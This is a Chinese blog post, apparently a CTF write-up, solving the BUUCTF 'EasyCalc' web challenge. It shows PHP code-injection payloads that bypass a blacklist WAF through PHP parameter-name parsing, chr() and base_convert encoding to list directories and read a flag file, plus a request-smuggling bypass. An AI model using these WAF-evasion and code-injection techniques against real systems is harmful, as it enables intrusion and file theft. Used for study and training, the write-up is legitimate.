@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>BUUCTF-web-EasyCalc | DD&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DD</h5>
+          <a href="mailto:277133779@qq.com" title="277133779@qq.com" class="mail">
+            
+              <span>2</span>
+            
+              <span>7</span>
+            
+              <span>7</span>
+            
+              <span>1</span>
+            
+              <span>3</span>
+            
+              <span>3</span>
+            
+              <span>7</span>
+            
+              <span>7</span>
+            
+              <span>9</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/codefine" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/custom"  >
+                <i class="icon icon-lg icon-plus-square"></i>
+                CUSTOM
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>BUUCTF-web-EasyCalc</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">BUUCTF-web-EasyCalc</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-10-23T02:07:43.000Z" itemprop="datePublished" class="page-time">
+  2019-10-23
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-BUUCTF-web-EasyCalc"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">BUUCTF-web-EasyCalc</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-10-23 10:07:43" datetime="2019-10-23T02:07:43.000Z"  itemprop="datePublished">2019-10-23</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>打开题目：</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/1.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/1.jpg"></a>
+<p>随便输入1，回显：</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/2.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/2.jpg"></a>
+<p>再尝试些敏感的关键词，回显：</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/3.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/3.jpg"></a>
+<p>看来是有waf，于是打开源码看看有唔提示：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I<span class="string">'ve set up WAF to ensure security.--&gt;'</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+encodeURIComponent($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(<span class="string">"#result"</span>).html(`&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"alert alert-success"</span>&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源码中提示了这题加了waf，我们访问calc.php，看到源码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由这个waf我们得知payload中不能含有”‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘`‘, ‘[‘, ‘]‘,’$‘,’\‘,’^‘“字符，除此之外，经过测试，这还过滤了字母，若num中含有字母则会返回403，所以除了上面这个waf、还有一个black_list</p>
+<p>那么第一步要做的就是绕过他们<br>其中一个最简单的办法就是直接在查询参数前面加个空格，即将<strong>?num=</strong>改为<strong>? num=</strong>即可绕过（在num前加个空格）</p>
+<h2 id="利用PHP的字符串解析特性Bypass"><a href="#利用PHP的字符串解析特性Bypass" class="headerlink" title="利用PHP的字符串解析特性Bypass"></a>利用PHP的字符串解析特性Bypass</h2><p>转至：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
+<p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/news.php?%20news[id%00=42<span class="string">"+AND+1=0--</span></span><br></pre></td></tr></table></figure>
+
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中</p>
+<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<table>
+<thead>
+<tr>
+<th align="left">User input</th>
+<th align="center">Decoded PHP</th>
+<th align="center">variable name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">%20foo_bar%20</td>
+<td align="center">foo_bar</td>
+<td align="center">foo_bar</td>
+</tr>
+<tr>
+<td align="left">foo%20bar%00</td>
+<td align="center">foo bar</td>
+<td align="center">foo_bar</td>
+</tr>
+<tr>
+<td align="left">foo%5bbar</td>
+<td align="center">foo[bar</td>
+<td align="center">foo_bar</td>
+</tr>
+</tbody></table>
+<p>parser_str函数如何处理字符串：</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/4.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/4.jpg"></a>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">foreach</span>(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"&#123;chr&#125;foo_bar"</span>,</span><br><span class="line">            <span class="string">"foo&#123;chr&#125;bar"</span>,</span><br><span class="line">            <span class="string">"foo_bar&#123;chr&#125;"</span></span><br><span class="line">        ] <span class="keyword">as</span> $k =&gt; $arg) &#123;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">255</span>;$i++) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"["</span>.$arg.<span class="string">"] check "</span>.bin2hex(chr($i)).<span class="string">""</span>;</span><br><span class="line">                parse_str(str_replace(<span class="string">"&#123;chr&#125;"</span>,chr($i),$arg).<span class="string">"=bla"</span>,$o);</span><br><span class="line">                <span class="comment">/* yes... I've added a sleep time on each loop just for </span></span><br><span class="line"><span class="comment">                the scenic effect :)</span></span><br><span class="line"><span class="comment">  like that movie with unrealistic </span></span><br><span class="line"><span class="comment">                brute-force where the password are obtained </span></span><br><span class="line"><span class="comment">                one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ </span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                usleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($o[<span class="string">"foo_bar"</span>])) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">                    <span class="keyword">echo</span> $arg.<span class="string">" -&gt; "</span>.bin2hex(chr($i)).<span class="string">" ("</span>.chr($i).<span class="string">")\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/5.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/5.jpg"></a>
+<p>parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。如上代码所示，我进行了多次循环，枚举了参数名三个位置的0到255之间的所有字符，看看解析函数到底是如何处理这些特殊字符的。结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.[1st]foo_bar</span><br><span class="line"></span><br><span class="line">2.foo[2nd]bar</span><br><span class="line"></span><br><span class="line">3.foo_bar[3rd]</span><br></pre></td></tr></table></figure>
+
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/6.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/6.jpg"></a>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/7.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/7.jpg"></a>
+<p>在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。</p>
+<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=phpinfo()</span><br></pre></td></tr></table></figure>
+
+<p>发现有禁用函数</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/8.png" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/8.png"></a>
+<p>不管，先找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=var_dump(scandir(dirname(dirname(dirname(getcwd())))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string <span class="variable">$path</span>) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure>
+
+<p>找到flag：</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/9.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/9.jpg"></a>
+
+<p>又因为过滤了些符号，不能直接var_dump(file_get_contents(‘/f1agg’))，所以想到了可以用编码绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法二：利用base-convert"><a href="#方法二：利用base-convert" class="headerlink" title="方法二：利用base_convert"></a>方法二：利用base_convert</h4><p> base_convert函数可以在任意进制之间转换数字，可以返回任意字母，需要注意它无法返回_ *等特殊字符</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/10.png" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/10.png"></a>
+<p>又发现dechex函数可以把10进制转换为16进制，我们可以再异或出hex2bin，来获取任意ASCII字符</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/11.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/11.jpg"></a>
+<p>可以构造var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))相当于car_dump(scandir(./))<br>找到f1agg后<br>可以构造出readfile(/f1agg)来读取文件<br>构造为：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))就可以得到flag文件。</p>
+<h2 id="协议层的攻击——HTTP请求走私"><a href="#协议层的攻击——HTTP请求走私" class="headerlink" title="协议层的攻击——HTTP请求走私"></a>协议层的攻击——HTTP请求走私</h2><p>除此之外，还有另一种方法可以绕过：<br>利用HTTP请求走私来绕过，该漏洞可以参考“协议层的攻击——HTTP请求走私”：<a href="https://paper.seebug.org/1048/#31-cl0get" target="_blank" rel="noopener">https://paper.seebug.org/1048/#31-cl0get</a></p>
+<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
+<p>理解为php中$_request 相同字段名优先接收post参数，就是这个同时向服务器传递get和post请求，而waf那里只处理了post请求的值，从而使get请求的值绕过了waf的拦截</p>
+<p>使用两个 “Content-Length” 绕过</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/12.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/12.jpg"></a>
+
+<p>payload同上</p>
+<a rel=BUUCTF-web-EasyCalc href="/2019/10/23/BUUCTF-web-EasyCalc/13.jpg" title="" data-fancybox="images"><img src="/2019/10/23/BUUCTF-web-EasyCalc/13.jpg"></a>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-06T09:27:11.670Z" itemprop="dateUpdated">2019-11-06 17:27:11</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/10/23/BUUCTF-web-EasyCalc/" target="_blank" rel="external">https://ddstick.github.io/2019/10/23/BUUCTF-web-EasyCalc/</a>
+        
+    </div>
+    <footer>
+        <a href="https://ddstick.github.io">
+            <img src="/img/avatar.jpg" alt="DD">
+            DD
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2019/10/23/BUUCTF-web-EasyCalc/&title=《BUUCTF-web-EasyCalc》 — DD's Blog&pic=https://ddstick.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2019/10/23/BUUCTF-web-EasyCalc/&title=《BUUCTF-web-EasyCalc》 — DD's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/10/20/BUUCTF-web-Checkln/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">BUUCTF-web-Checkln</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用PHP的字符串解析特性Bypass"><span class="post-toc-number">1.</span> <span class="post-toc-text">利用PHP的字符串解析特性Bypass</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#payload："><span class="post-toc-number">1.1.</span> <span class="post-toc-text">payload：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#方法一："><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">方法一：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#方法二：利用base-convert"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">方法二：利用base_convert</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#协议层的攻击——HTTP请求走私"><span class="post-toc-number">2.</span> <span class="post-toc-text">协议层的攻击——HTTP请求走私</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.lujingtao.com" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DD &copy; 2017 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2019/10/23/BUUCTF-web-EasyCalc/&title=《BUUCTF-web-EasyCalc》 — DD's Blog&pic=https://ddstick.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2019/10/23/BUUCTF-web-EasyCalc/&title=《BUUCTF-web-EasyCalc》 — DD's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3aO5IDIQwFQN//0t4DrE09SeMA6IkceBiaQIU+r1f8vOPn2//XK/9/6/WLBwMDY1tGdVvJCvmm1yske8PAwLiH0fvkep3o88G31v/HwMDASJZeh8uctF4BAwMDI2f0ssv1EWBgYGAkjCSJTT6fhNRe8vxYLo6BgbEhYxI0f/37J/0NDAyMrRjv4pMU1yalut6DgYFxNiMPcHlrM7+6FRLU5X4wMDDOZuQF/XyL1YRz0hwt9yUwMDA2ZPSudNUtzgc1IjAGBsbRjOqmq+nrZMxifX3EwMC4k9F8OUg+c3yeNmNgYNzJqBbFqiMa1UOpromBgXEeIx9rSC58OTsP8dHYBwYGxtGM/AJXHZKoFtcmR4CBgXEPo9rI7N3K8kJeL5HGwMA4jzFpQFa39eywRbnOh4GBsS1jclFLNjFhJ42EKOxiYGBszpiMdj1VjOs1RD9UDTEwMA5l9Apnk3GxvDGQj5phYGDcyXiqMfBUAa4wxoGBgXEoY1TkirdYbTAkbcsPuTgGBsZljN4FLr9W5mE3SoAxMDAuYPSCbDWhfXZoI+pXYGBgbM6YjE3MRy6qaXOUf2NgYBzH6AXWvLU5b0zmgx0YGBhnM0b9hCK4Ot5ROG8MDIwLGHngywNlsnLvmDAwMDCq7cbJ5nrlOQwMDIw8gZwU13rH8fVbGBgYFzCqIxG9a2I1BP+k3IaBgbEho5o6VtuZ81LaY01NDAyM/Rh/+CiyULAsujMAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
